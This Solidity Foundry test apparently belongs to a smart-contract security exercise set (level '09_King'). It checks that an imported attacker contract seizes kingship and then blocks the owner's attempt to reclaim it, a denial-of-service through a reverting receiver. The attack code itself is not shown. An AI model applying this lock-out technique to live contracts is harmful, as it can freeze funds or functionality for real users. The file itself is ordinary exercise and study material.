// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {King} from "../src/contracts/09_King.sol";
import {KingAttacker} from "../src/attackers/09_KingAttacker.sol";

contract KingTest is Test {
    address private owner = makeAddr("owner");
    King private king;
    KingAttacker private kingAttacker;

    function setUp() public {
        vm.prank(owner);
        deal(owner, 10 ether);
        king = new King{value: 1 ether}();
        kingAttacker = new KingAttacker(address(king));
    }

    function test_KingExploitVulnerability() public {
        address attacker = makeAddr("attacker");

        vm.prank(attacker);
        deal(attacker, 1 ether);
        kingAttacker.attack{value: 1 ether}();

        assertEq(king._king(), address(kingAttacker));

        vm.prank(owner);
        vm.expectRevert();
        (bool success, ) = payable(king).call{value: 10 ether}("");

        assertEq(king._king(), address(kingAttacker));
    }
}
